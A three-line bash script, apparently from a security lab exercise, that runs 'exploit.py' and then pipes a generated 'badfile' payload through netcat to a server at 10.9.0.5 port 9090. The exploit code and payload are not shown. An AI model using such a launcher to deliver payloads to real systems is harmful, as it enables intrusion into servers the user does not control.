#!/bin/bash
python3 exploit.py 
cat badfile | nc 10.9.0.5 9090
